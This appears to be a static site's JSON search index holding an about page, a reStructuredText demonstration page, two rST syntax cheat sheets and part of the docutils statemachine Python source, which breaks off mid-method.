{"pages":[{"title":"about","text":"I enjoy reversing, coding and hacking. If you lose your disc, or fail to follow commands, you will be subject to immediate deresolution. — Sark Inspired by: Material Design library from MaterializeCSS Theme ideas from Tyler Mulligan Project site ideas from Kevin Deldycke Pelican and Docutils work by Mosra Static site generated by Pelican in Python using Jinja2 .","tags":"pages","url":"pages/about.html"},{"title":"ReStructuredText Demo","text":"1 reStructuredText Demonstration 1.1 Examples of Syntax Constructs Author: David Goodger Address: 123 Example Street Example, EX Canada A1B 2C3 Contact: docutils-develop@lists.sourceforge.net Authors: Me; Myself; I organization: humankind date: $Date: 2012-01-03 19:23:53 +0000 (Tue, 03 Jan 2012) $ status: This is a \"work in progress\" revision: $Revision: 7302 $ version: 1 copyright: This document has been placed in the public domain. You may do with it as you wish. You may copy, modify, redistribute, reattribute, sell, buy, rent, lease, destroy, or improve it, quote it at length, excerpt, incorporate, collate, fold, staple, or mutilate it, or do anything else to it that your or anyone else's heart desires. field name: This is a generic bibliographic field. field name 2: Generic bibliographic fields may contain multiple body elements. Like this. Dedication: For Docutils users & co-developers. abstract: This document is a demonstration of the reStructuredText markup language, containing examples of all basic reStructuredText constructs and many advanced constructs. Table of Contents 1 reStructuredText Demonstration 1.1 Examples of Syntax Constructs 1.1.1 Structural Elements 1.1.1.1 Section Title 1.1.1.2 Transitions 1.1.2 Body Elements 1.1.2.1 Paragraphs 1.1.2.1.1 Inline Markup 1.1.2.2 Bullet Lists 1.1.2.3 Enumerated Lists 1.1.2.4 Definition Lists 1.1.2.5 Field Lists 1.1.2.6 Option Lists 1.1.2.7 Literal Blocks 1.1.2.8 Line Blocks 1.1.2.9 Block Quotes 1.1.2.10 Doctest Blocks 1.1.2.11 Tables 1.1.2.12 Footnotes 1.1.2.13 Citations 1.1.2.14 Targets 1.1.2.14.1 Duplicate Target Names 1.1.2.14.2 Duplicate Target Names 1.1.2.15 Directives 1.1.2.15.1 Document Parts 1.1.2.15.2 Images 1.1.2.15.3 Admonitions 1.1.2.15.4 Topics, Sidebars, and Rubrics 1.1.2.15.5 Target Footnotes 1.1.2.15.6 Replacement Text 1.1.2.15.7 Compound Paragraph 1.1.2.16 Substitution Definitions 1.1.2.17 Comments 1.1.3 Extensions 1.1.3.1 Code Blocks 1.1.3.2 Mathematics 1.1.3.2.1 An Identity of Ramanujan 1.1.3.2.2 Maxwell's Equations 1.1.3.3 Doc 1.1.4 Error Handling 1.1.1 Structural Elements 1.1.1.1 Section Title That's it, the text just above this line. 1.1.1.2 Transitions Here's a transition: It divides the section. 1.1.2 Body Elements 1.1.2.1 Paragraphs A paragraph. 1.1.2.1.1 Inline Markup Paragraphs contain text and may contain inline markup: emphasis , strong emphasis , inline literals, standalone hyperlinks ( http://www.python.org ), external hyperlinks ( Python [5] ), internal cross-references ( example ), external hyperlinks with embedded URIs ( Python web site ), footnote references (manually numbered [1] , anonymous auto-numbered [3] , labeled auto-numbered [2] , or symbolic [*] ), citation references ( [ CIT2002 ] ), substitution references ( ), and inline hyperlink targets (see Targets below for a reference back to here). Character-level inline markup is also possible (although exceedingly ugly!) in re Structured Text . The default role for interpreted text is Title Reference . Here are some explicit interpreted text roles: a PEP reference ( PEP 287 ); an RFC reference ( RFC 2822 ); a subscript ; a superscript ; and explicit roles for standard inline markup. Let's test wrapping and whitespace significance in inline literals: This is an example of —inline-literal —text, —including some— strangely—hyphenated-words. Adjust-the-width-of-your-browser-window to see how the text is wrapped. — —— ———— Now note the spacing between the words of this sentence (words should be grouped in pairs). If the —pep-references option was supplied, there should be a live link to PEP 258 here. 1.1.2.2 Bullet Lists A bullet list Nested bullet list. Nested item 2. Item 2. Paragraph 2 of item 2. Nested bullet list. Nested item 2. Third level. Item 2. Nested item 3. 1.1.2.3 Enumerated Lists Arabic numerals. lower alpha) (lower roman) upper alpha. upper roman) Lists that don't start at 1: Three Four C D iii iv List items may also be auto-enumerated. 1.1.2.4 Definition Lists Term Definition Term : classifier Definition paragraph 1. Definition paragraph 2. Term Definition 1.1.2.5 Field Lists what: Field lists map field names to field bodies, like database records. They are often part of an extension syntax. They are an unambiguous variant of RFC 2822 fields. how arg1 arg2: The field marker is a colon, the field name, and a colon. The field body may contain one or more body elements, indented relative to the field marker. 1.1.2.6 Option Lists For listing command-line options: -a command-line option \"a\" -b file options can have arguments and long descriptions --long options can be long also --input= file long options can also have arguments --very-long-option The description can also start on the next line. The description may contain multiple body elements, regardless of where it starts. -x , -y , -z Multiple options are an \"option group\". -v , --verbose Commonly-seen: short & long options. -1 file , --one= file , --two file Multiple options with arguments. /V DOS / VMS -style options too There must be at least two spaces between the option and the description. 1.1.2.7 Literal Blocks Literal blocks are indicated with a double-colon (\"::\") at the end of the preceding paragraph (over there —>). They can be indented: if literal_block: text = 'is left as-is' spaces_and_linebreaks = 'are preserved' markup_processing = None Or they can be quoted without indentation: >> Great idea! > > Why didn't I think of that? 1.1.2.8 Line Blocks This is a line block. It ends with a blank line. Each new line begins with a vertical bar (\"|\"). Line breaks and initial indents are preserved. Continuation lines are wrapped portions of long lines; they begin with a space in place of the vertical bar. The left edge of a continuation line need not be aligned with the left edge of the text above it. This is a second line block. Blank lines are permitted internally, but they must begin with a \"|\". Take it away, Eric the Orchestra Leader! A one, two, a one two three four Half a bee, philosophically, must, ipso facto , half not be. But half the bee has got to be, vis a vis its entity. D'you see? But can a bee be said to be or not to be an entire bee, when half the bee is not a bee, due to some ancient injury? Singing… 1.1.2.9 Block Quotes Block quotes consist of indented body elements: My theory by A. Elk. Brackets Miss, brackets. This theory goes as follows and begins now. All brontosauruses are thin at one end, much much thicker in the middle and then thin again at the far end. That is my theory, it is mine, and belongs to me and I own it, and what it is too. —Anne Elk (Miss) 1.1.2.10 Doctest Blocks >>> print 'Python-specific usage examples; begun with \">>>\"' Python-specific usage examples; begun with \">>>\" >>> print '(cut and pasted from interactive Python sessions)' (cut and pasted from interactive Python sessions) 1.1.2.11 Tables Here's a grid table followed by a simple table: Header row, column 1 (header rows optional) Header 2 Header 3 Header 4 body row 1, column 1 column 2 column 3 column 4 body row 2 Cells may span columns. body row 3 Cells may span rows. Table cells contain body elements. body row 4 body row 5 Cells may also be empty: —> Inputs Output A B A or B False False False True False True False True True True True True 1.1.2.12 Footnotes [1] ( 1 , 2 ) A footnote contains body elements, consistently indented by at least 3 spaces. This is the footnote's second paragraph. [2] ( 1 , 2 ) Footnotes may be numbered, either manually (as in [1] ) or automatically using a \"#\"-prefixed label. This footnote has a label so it can be referred to from multiple places, both as a footnote reference ( [2] ) and as a hyperlink reference ( label ). [3] This footnote is numbered automatically and anonymously using a label of \"#\" only. [*] Footnotes may also use symbols, specified with a \"*\" label. Here's a reference to the next footnote: [†] . [†] This footnote shows the next symbol in the sequence. [4] Here's an unreferenced footnote, with a reference to a nonexistent footnote. 1.1.2.13 Citations [ CIT2002 ] ( 1 , 2 ) Citations are text-labeled footnotes. They may be rendered separately and differently from footnotes. Here's a reference to the above, [ CIT2002 ] , and . 1.1.2.14 Targets This paragraph is pointed to by the explicit \"example\" target. A reference can be found under Inline Markup , above. Inline hyperlink targets are also possible. Section headers are implicit targets, referred to by name. See Targets , which is a subsection of Body Elements . Explicit external targets are interpolated into references such as \" Python [5] \". Targets may be indirect and anonymous. Thus this phrase may also refer to the Targets section. 1.1.2.14.1 Duplicate Target Names Duplicate names in section headers or other implicit targets will generate \"info\" (level-1) system messages. Duplicate names in explicit targets will generate \"warning\" (level-2) system messages. 1.1.2.14.2 Duplicate Target Names 1.1.2.15 Directives 1.1.2.15.1 Document Parts 1.1.2.15.2 Images 1.1.2.15.3 Admonitions 1.1.2.15.4 Topics, Sidebars, and Rubrics 1.1.2.15.5 Target Footnotes 1.1.2.15.6 Replacement Text 1.1.2.15.7 Compound Paragraph These are just a sample of the many reStructuredText Directives. For others, please see http://docutils.sourceforge.net/docs/ref/rst/directives.html . 1.1.2.15.1 Document Parts An example of the \"contents\" directive can be seen above this section (a local, untitled table of contents ) and at the beginning of the document (a document-wide table of contents ). 1.1.2.15.2 Images An image directive (also clickable — a hyperlink reference): A figure directive: A figure is an image with a caption and/or a legend: re Revised, revisited, based on ‘re' module. Structured Structure-enhanced text, structuredtext. Text Well it is, isn't it? This paragraph is also part of the legend. 1.1.2.15.3 Admonitions Attention! Directives at large. Caution! Don't take any wooden nickels. ! DANGER ! Mad scientist at work! Error Does not compute. Hint It's bigger than a bread box. Important Wash behind your ears. Clean up your room. Call your mother. Back up your data. Note This is a note. Tip 15% if the service is good. Warning Strong prose may provoke extreme mental exertion. Reader discretion is strongly advised. And, by the way… You can make up your own admonition too. 1.1.2.15.4 Topics, Sidebars, and Rubrics Sidebar Title Optional Subtitle This is a sidebar. It is for text outside the flow of the main text. This is a rubric inside a sidebar Sidebars often appears beside the main text with a border and background color. Topic Title This is a topic. This is a rubric 1.1.2.15.5 Target Footnotes [5] ( 1 , 2 , 3 ) http://www.python.org/ 1.1.2.15.6 Replacement Text I recommend you try Python, the best language around [5] . 1.1.2.15.7 Compound Paragraph This paragraph contains a literal block: Connecting... OK Transmitting data... OK Disconnecting... OK and thus consists of a simple paragraph, a literal block, and another simple paragraph. Nonetheless it is semantically one paragraph. This construct is called a compound paragraph and can be produced with the \"compound\" directive. 1.1.2.16 Substitution Definitions An inline image ( ) example: (Substitution definitions are not visible in the HTML source.) 1.1.2.17 Comments Here's one: (View the HTML source to see the comment.) 1.1.3 Extensions 1.1.3.1 Code Blocks Here's a neat implementation of the Sieve of Eratosthenes. 1 2 3 4 5 6 7 8 9 def sieve_of_eratosthenes (): factors = defaultdict ( set ) for n in count ( 2 ): if factors [ n ]: for m in factors . pop ( n ): factors [ n + m ] . add ( m ) else : factors [ n * n ] . add ( n ) yield n 1.1.3.2 Mathematics Here are some remarkable equations While displaying equations look good for a page of samples, the ability to mix math and text in a paragraph is also important. This expression √ ( 3 x − 1 ) + (1 + x ) 2 is an example of an inline equation. As you see, MathJax equations can be used this way as well, without unduly disturbing the spacing between lines. 1.1.3.2.1 An Identity of Ramanujan ( 1 )/( ( √ ( φ √ ( 5 ) ) − φ ) e ( 25 )/( π ) ) = 1 + ( e − 2 π )/( 1 + ( e − 4 π )/( 1 + ( e − 6 π )/( 1 + ( e − 8 π )/( 1 + … ) ) ) ) 1.1.3.2.2 Maxwell's Equations ∇ × B ⃗ − ( 1 )/( c ) ( ∂ E ⃗ )/( ∂ t ) = ( 4 π )/( c ) j ⃗ ∇⋅ E ⃗ = 4 π ρ ∇ × E ⃗ + ( 1 )/( c ) ( ∂ B ⃗ )/( ∂ t ) = 0 ⃗ ∇⋅ B ⃗ = 0 1.1.3.3 Doc 1.1.4 Error Handling Any errors caught during processing will generate system messages.","tags":"coding","url":"pages/restructuredtext-demo.html"},{"title":"Restructured Text syntax 2","text":"The reStructuredText Cheat Sheet: Syntax Reminders Info: See < http://docutils.sf.net/rst.html > for introductory docs. Author: David Goodger < goodger@python.org > Date: $Date: 2013-02-20 01:10:53 +0000 (Wed, 20 Feb 2013) $ Revision: $Revision: 7612 $ Description: This is a \"docinfo block\", or bibliographic field list Note If you are reading this as HTML , please read cheatsheet.txt instead to see the input syntax examples! Section Structure Section titles are underlined or overlined & underlined. Body Elements Grid table: Paragraphs are flush-left, separated by blank lines. Block quotes are indented. Literal block, preceded by \"::\": Indented or: > Quoted >>> print 'Doctest block' Doctest block Line blocks preserve line breaks & indents. [new in 0.3.6] Useful for addresses, verse, and adornment-free lists; long lines can be wrapped with continuation lines. Simple tables: List Type Examples (syntax in the text source ) Bullet list items begin with \"-\", \"+\", or \"*\" Enumerated list items use any variation of \"1.\", \"A)\", and \"(i)\" also auto-enumerated Definition list Term is flush-left : optional classifier Definition is indented, no blank line between Field list field name: field body Option list -o at least 2 spaces between option & description Explicit Markup Examples (visible in the text source ) Footnote [1] Manually numbered or [#] auto-numbered (even [#labelled]) or [*] auto-symbol Citation [ CIT2002 ] A citation. Hyperlink Target Anonymous Target Directive (\"::\") Substitution Def Comment Empty Comment (\"..\" on a line by itself, with blank lines before & after, used to separate indentation contexts) Inline Markup emphasis ; strong emphasis ; interpreted text ; interpreted text with role ; inline literal text; standalone hyperlink, http://docutils.sourceforge.net ; named reference, reStructuredText ; anonymous reference ; footnote reference, [1] ; citation reference, [ CIT2002 ] ; like an inline directive; inline internal target . Directive Quick Reference See < http://docutils.sf.net/docs/ref/rst/directives.html > for full info. Directive Name Description (Docutils version added to, in [brackets]) attention Specific admonition; also \"caution\", \"danger\", \"error\", \"hint\", \"important\", \"note\", \"tip\", \"warning\" admonition Generic titled admonition: .. admonition:: By The Way image .. image:: picture.png; many options possible figure Like \"image\", but with optional caption and legend topic .. topic:: Title; like a mini section sidebar .. sidebar:: Title; like a mini parallel document parsed-literal A literal block with parsed inline markup rubric .. rubric:: Informal Heading epigraph Block quote with class=\"epigraph\" highlights Block quote with class=\"highlights\" pull-quote Block quote with class=\"pull-quote\" compound Compound paragraphs [0.3.6] container Generic block-level container element [0.3.10] table Create a titled table [0.3.1] list-table Create a table from a uniform two-level bullet list [0.3.8] csv-table Create a table from CSV data [0.3.4] contents Generate a table of contents sectnum Automatically number sections, subsections, etc. header, footer Create document decorations [0.3.8] target-notes Create an explicit footnote for each external target math Mathematical notation (input in LaTeX format) meta HTML -specific metadata include Read an external reST file as if it were inline raw Non-reST data passed untouched to the Writer replace Replacement text for substitution definitions unicode Unicode character code conversion for substitution defs date Generates today's date; for substitution defs class Set a \"class\" attribute on the next element role Create a custom interpreted text role [0.3.2] default-role Set the default interpreted text role [0.3.10] title Set the metadata document title [0.3.10] Interpreted Text Role Quick Reference See < http://docutils.sf.net/docs/ref/rst/roles.html > for full info. Role Name Description emphasis Equivalent to emphasis literal Equivalent to literal but processes backslash escapes math Mathematical notation (input in LaTeX format) PEP Reference to a numbered Python Enhancement Proposal RFC Reference to a numbered Internet Request For Comments raw For non-reST data; cannot be used directly (see docs) [0.3.6] strong Equivalent to strong sub Subscript sup Superscript title Title reference (book, etc.); standard default role","tags":"cheatsheet","url":"pages/restructured_text_syntax.html"},{"title":"Restructured Text Cheatsheet","text":"Inline Markup Inline markup allows words and phrases within text to have character styles (like italics and boldface) and functionality (like hyperlinks). *emphasis* emphasis **strong emphasis** strong emphasis `interpreted text` The rendering and meaning of interpreted text is domain- or application-dependent. ``inline literal`` inline literal reference_ reference `phrase reference`_ phrase reference anonymous__ anonymous _`inline internal target` inline internal target |substitution reference| The result is substituted in from the substitution definition. footnote reference [1]_ footnote reference [1] citation reference [CIT2002]_ citation reference [ CIT2002 ] http://docutils.sf.net/ http://docutils.sf.net/ Escaping with Backslashes reStructuredText uses backslashes (\"\\\") to override the special meaning given to markup characters and get the literal characters themselves. To get a literal backslash, use an escaped backslash (\"\\\"). For example: *escape* ``with`` \"\\\" escape with \"\" \\*escape* \\``with`` \"\\\\\" *escape* \"with\" \"\\\" Lists - This is item 1. A blank line before the first and last items is required. - This is item 2 - Item 3: blank lines between items are optional. - Item 4: Bullets are \"-\", \"*\" or \"+\". Continuing text must be aligned after the bullet and whitespace. This is item 1. A blank line before the first and last items is required. This is item 2 Item 3: blank lines between items are optional. Item 4: Bullets are \"-\", \"*\" or \"+\". Continuing text must be aligned after the bullet and whitespace. 3. This is the first item 4. This is the second item 5. Enumerators are arabic numbers, single letters, or roman numerals 6. List items should be sequentially numbered, but need not start at 1 (although not all formatters will honour the first index). #. This item is auto-enumerated This is the first item This is the second item Enumerators are arabic numbers, single letters, or roman numerals List items should be sequentially numbered, but need not start at 1 (although not all formatters will honour the first index). This item is auto-enumerated what Definition lists associate a term with a definition. how The term is a one-line phrase, and the definition is one or more paragraphs or body elements, indented relative to the term. Blank lines are not allowed between term and definition. what Definition lists associate a term with a definition. how The term is a one-line phrase, and the definition is one or more paragraphs or body elements, indented relative to the term. Blank lines are not allowed between term and definition. :Authors: Tony J. (Tibs) Ibbs, David Goodger (and sundry other good-natured folks) :Version: 1.0 of 2001/08/08 :Dedication: To my father. Authors: Tony J. (Tibs) Ibbs, David Goodger (and sundry other good-natured folks) Version: 1.0 of 2001/08/08 Dedication: To my father. -a command-line option \"a\" -b file options can have arguments and long descriptions --long options can be long also --input=file long options can also have arguments /V DOS/VMS-style options too -a command-line option \"a\" -b file options can have arguments and long descriptions --long options can be long also --input= file long options can also have arguments /V DOS / VMS -style options too Section Structure Title ===== Titles are underlined (or over- and underlined) with a nonalphanumeric character at least as long as the text. A lone top-level section is lifted up to be the document's title. Any non-alphanumeric character can be used, but Python convention is: * ``#`` with overline, for parts * ``*`` with overline, for chapters * ``=``, for sections * ``-``, for subsections * ``&#94;``, for subsubsections * ``\"``, for paragraphs Title Titles are underlined (or over- and underlined) with a nonalphanumeric character at least as long as the text. A lone top-level section is lifted up to be the document's title. Any non-alphanumeric character can be used, but Python convention is: # with overline, for parts * with overline, for chapters =, for sections -, for subsections &#94;, for subsubsections \" , for paragraphs Blocks This is a paragraph. Paragraphs line up at their left edges, and are normally separated by blank lines. This is a paragraph. Paragraphs line up at their left edges, and are normally separated by blank lines. A paragraph containing only two colons indicates the following indented or quoted text is a literal block or quoted text is a literal block. :: Whitespace, newlines, blank lines, and all kinds of markup (like *this* or \\this) is preserved here. You can also tack the ``::`` at the end of a paragraph:: It's very convenient to use this form. Per-line quoting can also be used for unindented blocks:: > Useful for quotes from email and > for Haskell literate programming. A paragraph containing only two colons indicates that the following indented or quoted text is a literal block. Whitespace, newlines, blank lines, and all kinds of markup (like *this* or \\this) is preserved by literal blocks. You can also tack the :: at the end of a paragraph: It's very convenient to use this form. Per-line quoting can also be used for unindented blocks: > Useful for quotes from email and > for Haskell literate programming. | Line blocks are useful for addresses, | verse, and adornment-free lists. | | Each new line begins with a | vertical bar (\"|\"). | Line breaks and initial indents | are preserved. | Continuation lines are wrapped portions of long lines; they begin with spaces in place of vertical bars. Line blocks are useful for addresses, verse, and adornment-free lists. Each new line begins with a vertical bar (\"|\"). Line breaks and initial indents are preserved. Continuation lines are wrapped portions of long lines; they begin with spaces in place of vertical bars. Block quotes are just: Indented paragraphs, and they may nest. Block quotes are just: Indented paragraphs, and they may nest. Doctest blocks are interactive Python sessions. They begin with \"``>>>``\" and end with a blank line. >>> print \"This is a doctest block.\" This is a doctest block. Doctest blocks are interactive Python sessions. They begin with \">>>\" and end with a blank line. >>> print \"This is a doctest block.\" This is a doctest block. A transition marker is a horizontal line of 4 or more repeated punctuation characters. ------------ A transition should not begin or end a section or document, nor should two transitions be immediately adjacent. A transition marker is a horizontal line of 4 or more repeated punctuation characters. A transition should not begin or end a section or document, nor should two transitions be immediately adjacent. Tables There are two syntaxes for tables in reStructuredText. Grid tables are complete but cumbersome to create. Simple tables are easy to create but limited (no row spans, etc.). +------------+------------+-----------+ | Header 1 | Header 2 | Header 3 | +============+============+===========+ | body row 1 | column 2 | column 3 | +------------+------------+-----------+ | body row 2 | Cells may span columns.| +------------+------------+-----------+ | body row 3 | Cells may | - Cells | +------------+ span rows. | - contain | | body row 4 | | - blocks. | +------------+------------+-----------+ Header 1 Header 2 Header 3 body row 1 column 2 column 3 body row 2 Cells may span columns. body row 3 Cells may span rows. Cells contain blocks. body row 4 ===== ===== ====== Inputs Output ------------ ------ A B A or B ===== ===== ====== False False False True False True False True True True True True ===== ===== ====== Inputs Output A B A or B False False False True False True False True True True True True Explicit Markup Explicit markup blocks are used for constructs which float (footnotes), have no direct paper-document representation (hyperlink targets, comments), or require specialized processing (directives). They all begin with two periods and whitespace, the \"explicit markup start\". Footnote references, like [5]_. Note that footnotes may get rearranged, e.g., to the bottom of the \"page\". .. [5] A numerical footnote. Note there's no colon after the ``]``. Footnote references, like [5] . Note that footnotes may get rearranged, e.g., to the bottom of the \"page\". [5] A numerical footnote. Note there's no colon after the ]. Autonumbered footnotes are possible, like using [#]_ and [#]_. .. [#] This is the first one. .. [#] This is the second one. They may be assigned 'autonumber labels' - for instance, [#fourth]_ and [#third]_. .. [#third] a.k.a. third_ .. [#fourth] a.k.a. fourth_ Autonumbered footnotes are possible, like using [1] and [2] . [1] This is the first one. [2] This is the second one. They may be assigned ‘autonumber labels' - for instance, [4] and [3] . [3] a.k.a. third [4] a.k.a. fourth Auto-symbol footnotes are also possible, like this: [*]_ and [*]_. .. [*] This is the first one. .. [*] This is the second one. Auto-symbol footnotes are also possible, like this: [*] and [†] . [*] This is the first one. [†] This is the second one. Citation references, like [CIT2002]_. Note that citations may get rearranged, e.g., to the bottom of the \"page\". .. [CIT2002] A citation (as often used in journals). Citation labels contain alphanumerics, underlines, hyphens and fullstops. Case is not significant. Given a citation like [this]_, one can also refer to it like this_. .. [this] here. Citation references, like [ CIT2002 ] . Note that citations may get rearranged, e.g., to the bottom of the \"page\". [ CIT2002 ] ( 1 , 2 ) A citation (as often used in journals). Citation labels contain alphanumerics, underlines, hyphens and fullstops. Case is not significant. Given a citation like [this] , one can also refer to it like this . [this] here. External hyperlinks, like Python_. .. _Python: http://www.python.org/ External hyperlinks, like Python . External hyperlinks, like `Python <http://www.python.org/>`_. External hyperlinks, like Python . Internal crossreferences, like example_. .. _example: This is an example crossreference target. Internal crossreferences, like example . This is an example crossreference target. Python_ is `my favourite programming language`__. .. _Python: http://www.python.org/ __ Python_ Python is my favourite programming language . Titles are targets, too ======================= Implict references, like `Titles are targets, too`_. Titles are targets, too Implict references, like Titles are targets, too . Directives are a general-purpose extension mechanism, a way of adding support for new constructs without adding new syntax. For a description of all standard directives, see reStructuredText Directives ( http://is.gd/2Ecqh ). For instance: .. image:: {filename}/images/hex.gif :width: 40pt :alt: img For instance: Substitutions are like inline directives, allowing graphics and arbitrary constructs within text. The |biohazard| symbol must be used on containers used to dispose of medical waste. .. |biohazard| image:: {filename}/images/biohazard.png :align: middle :width: 48 The symbol must be used on containers used to dispose of medical waste. Any text which begins with an explicit markup start but doesn't use the syntax of any of the constructs above, is a comment. .. This text will not be shown (but, for instance, in HTML might be rendered as an HTML comment) An \"empty comment\" does not consume following blocks. (An empty comment is \"..\" with blank lines before and after.) .. So this block is not \"lost\", despite its indentation. An \"empty comment\" does not consume following blocks. (An empty comment is \"..\" with blank lines before and after.) So this block is not \"lost\", despite its indentation. Credits CP Font from LiquiType: http://www.liquitype.com/workshop/type_design/cp-mono Magnetic Balls V2 image by fdecomite: http://www.flickr.com/photos/fdecomite/2926556794/ Sponsored by Net Managers http://www.netmanagers.com.ar Typeset using rst2pdf http://rst2pdf.googlecode.com","tags":"coding","url":"pages/rst-cheatsheet.html"},{"title":"state-machine","text":"1 # Copyright: This module has been placed in the public domain. 2 3 \"\"\" 4 A finite state machine specialized for regular-expression-based text filters, 5 this module defines the following classes: 6 7 - `StateMachine` , a state machine 8 - `State` , a state superclass 9 - `StateMachineWS` , a whitespace-sensitive version of `StateMachine` 10 - `StateWS` , a state superclass for use with `StateMachineWS` 11 - `SearchStateMachine` , uses `re.search()` instead of `re.match()` 12 - `SearchStateMachineWS` , uses `re.search()` instead of `re.match()` 13 - `ViewList` , extends standard Python lists. 14 - `StringList` , string-specific ViewList. 15 16 Exception classes: 17 18 - `StateMachineError` 19 - `UnknownStateError` 20 - `DuplicateStateError` 21 - `UnknownTransitionError` 22 - `DuplicateTransitionError` 23 - `TransitionPatternNotFound` 24 - `TransitionMethodNotFound` 25 - `UnexpectedIndentationError` 26 - `TransitionCorrection` : Raised to switch to another transition. 27 - `StateCorrection` : Raised to switch to another state & transition. 28 29 Functions: 30 31 - `string2lines()` : split a multi-line string into a list of one-line strings 32 33 34 How To Use This Module 35 ====================== 36 (See the individual classes, methods, and attributes for details.) 37 38 1. Import it: ``import statemachine`` or ``from statemachine import ...`` . 39 You will also need to ``import re`` . 40 41 2. Derive a subclass of `State` (or `StateWS` ) for each state in your state 42 machine :: 43 44 class MyState(statemachine.State): 45 46 Within the state's class definition: 47 48 a) Include a pattern for each transition, in `State.patterns` :: 49 50 patterns = {'atransition': r'pattern', ...} 51 52 b) Include a list of initial transitions to be set up automatically, in 53 `State.initial_transitions` :: 54 55 initial_transitions = ['atransition', ...] 56 57 c) Define a method for each transition, with the same name as the 58 transition pattern :: 59 60 def atransition(self, match, context, next_state): 61 # do something 62 result = [...] # a list 63 return context, next_state, result 64 # context, next_state may be altered 65 66 Transition methods may raise an `EOFError` to cut processing short. 67 68 d) You may wish to override the `State.bof()` and/or `State.eof()` implicit 69 transition methods, which handle the beginning- and end-of-file. 70 71 e) In order to handle nested processing, you may wish to override the 72 attributes `State.nested_sm` and/or `State.nested_sm_kwargs` . 73 74 If you are using `StateWS` as a base class, in order to handle nested 75 indented blocks, you may wish to: 76 77 - override the attributes `StateWS.indent_sm` , 78 `StateWS.indent_sm_kwargs` , `StateWS.known_indent_sm` , and/or 79 `StateWS.known_indent_sm_kwargs` ; 80 - override the `StateWS.blank()` method; and/or 81 - override or extend the `StateWS.indent()` , `StateWS.known_indent()` , 82 and/or `StateWS.firstknown_indent()` methods. 83 84 3. Create a state machine object:: 85 86 sm = StateMachine(state_classes=[MyState, ...], 87 initial_state='MyState') 88 89 4. Obtain the input text, which needs to be converted into a tab-free list of 90 one-line strings. For example, to read text from a file called 91 'inputfile' :: 92 93 input_string = open('inputfile').read() 94 input_lines = statemachine.string2lines(input_string) 95 96 5. Run the state machine on the input text and collect the results, a list:: 97 98 results = sm.run(input_lines) 99 100 6. Remove any lingering circular references:: 101 102 sm.unlink() 1 __docformat__ = 'restructuredtext' 2 3 import sys 4 import re 5 import types 6 import unicodedata 7 from docutils import utils 8 from docutils.utils.error_reporting import ErrorOutput 9 10 11 class StateMachine : 12 13 \"\"\" 14 A finite state machine for text filters using regular expressions. 15 16 The input is provided in the form of a list of one-line strings (no 17 newlines). States are subclasses of the `State` class. Transitions consist 18 of regular expression patterns and transition methods, and are defined in 19 each state. 20 21 The state machine is started with the `run()` method, which returns the 22 results of processing in a list. 23 \"\"\" 24 25 def __init__ ( self , state_classes , initial_state , debug = False ): 26 \"\"\" 27 Initialize a `StateMachine` object; add state objects. 28 29 Parameters: 30 31 - `state_classes`: a list of `State` (sub)classes. 32 - `initial_state`: a string, the class name of the initial state. 33 - `debug`: a boolean; produce verbose output if true (nonzero). 34 \"\"\" 35 36 self . input_lines = None 37 \"\"\"`StringList` of input lines (without newlines). 38 Filled by `self.run()`.\"\"\" 39 40 self . input_offset = 0 41 \"\"\"Offset of `self.input_lines` from the beginning of the file.\"\"\" 42 43 self . line = None 44 \"\"\"Current input line.\"\"\" 45 46 self . line_offset = - 1 47 \"\"\"Current input line offset from beginning of `self.input_lines`.\"\"\" 48 49 self . debug = debug 50 \"\"\"Debugging mode on/off.\"\"\" 51 52 self . initial_state = initial_state 53 \"\"\"The name of the initial state (key to `self.states`).\"\"\" 54 55 self . current_state = initial_state 56 \"\"\"The name of the current state (key to `self.states`).\"\"\" 57 58 self . states = {} 59 \"\"\"Mapping of {state_name: State_object}.\"\"\" 60 61 self . add_states ( state_classes ) 62 63 self . observers = [] 64 \"\"\"List of bound methods or functions to call whenever the current 65 line changes. Observers are called with one argument, ``self``. 66 Cleared at the end of `run()`.\"\"\" 67 68 self . _stderr = ErrorOutput () 69 \"\"\"Wrapper around sys.stderr catching en-/decoding errors\"\"\" 70 71 72 def unlink ( self ): 73 \"\"\"Remove circular references to objects no longer required.\"\"\" 74 for state in self . states . values (): 75 state . unlink () 76 self . states = None 77 78 def run ( self , input_lines , input_offset = 0 , context = None , 79 input_source = None , initial_state = None ): 80 \"\"\" 81 Run the state machine on `input_lines`. Return results (a list). 82 83 Reset `self.line_offset` and `self.current_state`. Run the 84 beginning-of-file transition. Input one line at a time and check for a 85 matching transition. If a match is found, call the transition method 86 and possibly change the state. Store the context returned by the 87 transition method to be passed on to the next transition matched. 88 Accumulate the results returned by the transition methods in a list. 89 Run the end-of-file transition. Finally, return the accumulated 90 results. 91 92 Parameters: 93 94 - `input_lines`: a list of strings without newlines, or `StringList`. 95 - `input_offset`: the line offset of `input_lines` from the beginning 96 of the file. 97 - `context`: application-specific storage. 98 - `input_source`: name or path of source of `input_lines`. 99 - `initial_state`: name of initial state. 100 \"\"\" 101 self . runtime_init () 102 if isinstance ( input_lines , StringList ): 103 self . input_lines = input_lines 104 else : 105 self . input_lines = StringList ( input_lines , source = input_source ) 106 self . input_offset = input_offset 107 self . line_offset = - 1 108 self . current_state = initial_state or self . initial_state 109 if self . debug : 110 print >> self . _stderr , ( 111 u ' \\n StateMachine.run: input_lines (line_offset= %s ): \\n | %s ' 112 % ( self . line_offset , u ' \\n | ' . join ( self . input_lines ))) 113 transitions = None 114 results = [] 115 state = self . get_state () 116 try : 117 if self . debug : 118 print >> self . _stderr , ' \\n StateMachine.run: bof transition' 119 context , result = state . bof ( context ) 120 results . extend ( result ) 121 while True : 122 try : 123 try : 124 self . next_line () 125 if self . debug : 126 source , offset = self . input_lines . info ( 127 self . line_offset ) 128 print >> self . _stderr , ( 129 u ' \\n StateMachine.run: line (source= %r , ' 130 u 'offset= %r ): \\n | %s ' 131 % ( source , offset , self . line )) 132 context , next_state , result = self . check_line ( 133 context , state , transitions ) 134 except EOFError : 135 if self . debug : 136 print >> self . _stderr , ( 137 ' \\n StateMachine.run: %s .eof transition' 138 % state . __class__ . __name__ ) 139 result = state . eof ( context ) 140 results . extend ( result ) 141 break 142 else : 143 results . extend ( result ) 144 except TransitionCorrection , exception : 145 self . previous_line () # back up for another try 146 transitions = ( exception . args [ 0 ],) 147 if self . debug : 148 print >> self . _stderr , ( 149 ' \\n StateMachine.run: TransitionCorrection to ' 150 'state \" %s \", transition %s .' 151 % ( state . __class__ . __name__ , transitions [ 0 ])) 152 continue 153 except StateCorrection , exception : 154 self . previous_line () # back up for another try 155 next_state = exception . args [ 0 ] 156 if len ( exception . args ) == 1 : 157 transitions = None 158 else : 159 transitions = 